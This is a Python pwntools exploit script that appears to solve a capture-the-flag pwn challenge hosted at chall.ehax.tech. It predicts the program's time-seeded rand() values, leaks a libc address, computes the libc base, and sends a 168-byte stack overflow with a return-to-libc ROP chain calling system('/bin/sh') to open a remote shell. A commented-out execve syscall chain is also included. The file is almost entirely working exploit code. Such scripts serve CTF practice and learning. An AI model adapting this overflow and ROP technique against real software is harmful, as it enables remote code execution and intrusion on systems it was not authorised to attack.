#!/usr/bin/env python3

from pwn import *
from ctypes import *

exe = ELF("./chall_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)
glibc = CDLL(libc.path)
context.binary = exe


def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("chall.ehax.tech", 4269)

    return p


def main():
    p = conn()

    input()

    # Leak libc
    glibc.srand(glibc.time())
    p.recvuntil(b'0x44')
    ran = glibc.rand() % 42 + 2
    # print(ran)
    for i in range(67):
        p.recvuntil(b'0x44')
        ran = glibc.rand() % 42 + 2
        # print(ran)
        if i == 41:
            p.recvuntil(b'4D')
            data = p.recvuntil(b'0x44').decode()
            libc_leak = data.split('0x')[1][:12]
            libc_leak = int(f'0x{libc_leak}', 16)
            print("Libc leak: " + hex(libc_leak))

    libc.address = libc_leak - 0x1255e0
    print("Libc base: " + hex(libc.address))

    rw_section = 0x3fe700
    pop_rdi = 0x000000000002164f + libc.address
    pop_rsi = 0x0000000000023a6a + libc.address
    pop_rdx = 0x0000000000001b96 + libc.address
    pop_rax = 0x000000000001b500 + libc.address
    syscall = 0x0000000000002743 + libc.address
    ret = 0x00000000000008aa + libc.address
    # payload = b'a'*168 + p64(pop_rdi) + p64(rw_section) + p64(libc.sym['gets'])
    # payload += p64(pop_rdi) + p64(rw_section)
    # payload += p64(pop_rsi) + p64(0)
    # payload += p64(pop_rdx) + p64(0)
    # payload += p64(pop_rax) + p64(0x3b)
    # payload += p64(ret) + p64(syscall)
    payload = b'a'*168 + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(ret) + p64(libc.sym['system'])
    p.sendlineafter(b'authcode: ', payload)

    p.sendline(b'/bin/sh')

    p.interactive()


if __name__ == "__main__":
    main()
